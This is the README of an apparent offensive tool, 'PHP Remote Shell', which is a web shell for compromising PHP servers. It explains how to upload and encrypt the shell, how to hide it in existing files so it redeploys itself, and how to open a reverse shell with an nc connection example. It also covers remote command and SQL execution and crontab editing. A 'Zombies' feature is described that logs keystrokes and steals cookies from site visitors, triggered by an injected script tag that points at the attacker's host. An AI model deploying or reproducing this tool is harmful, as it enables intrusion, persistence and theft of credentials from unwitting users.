# PHP Remote Shell

PHP Remote Shell is a Swiss army knife for exploring servers through the Web. It contains a reverse shell in PHP, a full file browser, the ability to execute shell commands or PHP / SQL / LDAP code, crontab management and « zombies » management. It can also nest itself in existing files in order to redeploy automatically during their execution. If it has been previously encrypted, it is able to decrypt itself on the fly.

It was designed to be robust and work with just about any POSIX server with a decent version of PHP. It may look a bit rustic at times, but it should work everywhere.

PHP Remote Shell will be as silent as possible, using only POST requests, displaying images using inline data, keeping session in its own file instead of cookies when possible, and so on.

## Requirement

You need a POSIX machine with PHP CLI on local, and a POSIX server with a PHP web service up on remote.

## Installation
If you retrieved PRS by cloning the Git repository, you first need to change the permissions of some files as follows :
```bash
chmod +x encryption/crypt.php strip/strip.php
```
To install and use PRS you just have to put `prs.php` somewhere on the Web and access it with a POST request (GET requests will display a HTTP 404 error).

The simplest way to request PRS URL once uploaded is to open `launcher.html` with a web browser and fill the form.

You can use PRS _as is_ or you can encrypt it before uploading it on the remote host. Encryption is a guaranty for you that nobody will read the source code neither your authentication parameters if any. Knowing this, you can add what you want in it, your secrets will be well protected, even on remote :-)

To encrypt the script, go to `encryption/` and execute `./crypt.php yourpasswd`. The final encrypted `prs.php` file will be created in the same directory. This is the file to upload on remote host.

The `launcher.html` file allow you to specify your encryption password before requesting the PRS page.

To force PRS to ask for authentication, edit the script and fill the `Authentication` section constants.

To allow direct download of PRS file, just pass it `prsds=` as URL parameter :

```
http://remote-server/prs.php?prsds=
```

_Note that this will not work if you previously defined `CHECK_AUTH` or if you have encrypted PRS file_.

The original script name of PRS is `prs.php` but you can rename it as you want !

## Usage

### Edit

Allow you to open the `Profiles management` popup to save sessions and retrieve them later.

### Remote information

Displays the result of some common tools, plus the output of the `phpinfo()` function if available.

### Shell

#### Reverse shell

If the remote PHP allows it, let you choose a remote IP and port on which listening with a full PHP reverse shell.

It is just a basic shell, which means that sometimes it will not work and that the connection may be cut of or looped at any time. Some commands will be rewritten (like `ping` or `top`), others will be emulated (like `clear`). It is likely that in dying (when you grab the `shutdown` command from your client) it causes a zombie process.

Use `netcat` or any other client on your local machine to execute bash commands on the remote host.

```bash
you@local~$ nc 192.168.3.5 4000
PRS reverse shell 0.12.1
'quit' to quit, 'shutdown' to kill, 'help' for this help
www-data@192.168.3.5 /var/wwww$
```

#### Command execution

Sometime, reverse shell is not possible. This section allows you to execute bash commands and see their results directly from the PRS web page.

### PHP code

With this feature, you can write PHP code, execute it on the remote host and see the result.

### File browser

PRS file browser allows you a lot of things. You can create/edit/delete files, view symlinks and so on. It looks a lot like the output of the `ls` command, with some improvements.

#### Host me in

This feature of the file browser bottom menu allows you to « host » PRS on another PHP script. If someone ever erases it, it would be automatically recreated by calling this page.

### Crontab

Where possible, it allows you to edit, save or even remove the crontab of the current web user.

### Zombies

_This feature will not work if PRS file has been previously encrypted._ Use it only for fun and non-profit ;-)

You can have fun spying remote user's keyboard, injecting code, stealing cookies and so on. You can also web ping hosts on user's private network before launching CSRF attack for example. But, once again : it is instable, not stealth...

To create a zombie, inject the following HTML code in a web page :
```html
<script src="http://remote-server/prs.php?z=js"></script>
```
Then go to the PRS `Zombies` menu and wait until it appears on the list.

### SQL / LDAP

This menu allows you to access remote SQL or LDAP database assuming you know their access settings. For now it can manage MySQL (`mysql`, `mysqli`, `pdo_mysql`), PostgreSQL (`pgsql`, `pdo_pgsql`) and LDAP. It offers some basic macros, but most of the work will have to be done in SQL.

## License
GPL
